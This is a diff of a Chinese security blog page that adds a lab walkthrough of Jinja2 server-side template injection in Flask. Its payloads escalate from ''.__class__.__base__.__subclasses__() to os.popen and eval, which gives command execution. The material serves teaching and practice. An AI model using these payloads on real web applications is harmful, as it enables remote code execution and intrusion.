@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.1k</span>
+            <span class="post-count">2.5k</span>
         </span>
     </span>
 
@@ -99,7 +99,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">9 分钟</span>
+            <span class="post-count">10 分钟</span>
         </span>
     </span>
 </div>
@@ -376,6 +376,29 @@ url<span class="token operator">=</span><span class="token builtin">input</span>
 <h3 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h3><p><img src="https://img-blog.csdnimg.cn/0498fbef7bdf44af8fb9901a42397b70.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/0d25651fb09747b58d80bf62fd7a4924.png" alt="123"> <img src="https://img-blog.csdnimg.cn/4fa2f3bb6f31499ca1cd233021e76b3a.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2a5b3fea2be4f459debf419da9c668d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/9725d59f92c6414fa6bf79e987ef8d41.png" alt="456"></p>
 <h3 id="过滤器绕过下划线过滤"><a href="#过滤器绕过下划线过滤" class="headerlink" title="过滤器绕过下划线过滤"></a>过滤器绕过下划线过滤</h3><p><img src="https://img-blog.csdnimg.cn/c94604ff42234859be94be5fd95995d1.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9f77f111586a4a7bb36576882e392bd0.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/e54f250d97794204bd0ea7a7a5358e8d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/a9ab18ed669941afa2e9ab7a3a000480.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2605697c1f0494baff5ae23a6195692.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/d50175a108264f048e38e4162bf25d2d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/766e77f05f154194bf82a7b2e5298e03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2bcf11b047e348c8b4d36ddd1b71af40.png" alt="789"></p>
 <h3 id="中括号绕过点过滤"><a href="#中括号绕过点过滤" class="headerlink" title="中括号绕过点过滤"></a>中括号绕过点过滤</h3><p><img src="https://img-blog.csdnimg.cn/07a73d95f15949b994c50dda1355bdaf.png" alt="789"></p>
+<h2 id="flask过滤练习"><a href="#flask过滤练习" class="headerlink" title="flask过滤练习"></a>flask过滤练习</h2><h3 id="flask无过滤"><a href="#flask无过滤" class="headerlink" title="flask无过滤"></a>flask无过滤</h3><p>这个是没有任何过滤，采用的是flask框架的jinja2模板，<br>先拿它做实验<br>首先获取空字符串对象的基类<code>object</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+或者code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>获取基类<code>object</code>的所有子类<br>根据常用注入模块我们查找是否含有<code>&lt;class &#39;os._wrap_close&#39;&gt;</code><br><img src="https://img-blog.csdnimg.cn/07180aa1b9d24427a032f3c92c53d4e5.png" alt="789"><br>这个时候找到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>对应的编号，将所有子类复制出来按行排列，由于记事本是从1行开始排列，而我们计算子类是从0开始，显示在118行，对应编号为117</p>
+<blockquote>
+<p>Python中索引是从0开始的<br>请注意，由于__subclasses__()方法返回的是当前运行时所有直接子类的列表，具体的子类顺序可能会随着Python版本、实现和环境的变化而有所不同。因此，这段代码的具体输出将取决于你运行的Python环境。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/9ada2137faee4a4fb673024cf7b55701.png" alt="789"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://img-blog.csdnimg.cn/952bf190e6cb481f816fb6cb7bc31605.png" alt="456"></p>
+<p>访问该子类的 <code>__init__ </code>方法的<code>__globals__</code>属性。<br>发现有os函数<br><img src="https://img-blog.csdnimg.cn/bf73577451764a219ad24f0b3f8e9877.png" alt="123"><br>在这里可以直接使用</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>或者使用<code>__builtins__</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/d09578caf19e40f08cd1f334b088e455.png" alt="789"><br>利用内建函数eval<br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e33fd0455ba04537806411548a066568.png" alt="1"><br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/f0a6e437eb5c4283a359731cb10d73fe.png" alt="789"></p>
  
       <!-- reward -->
       
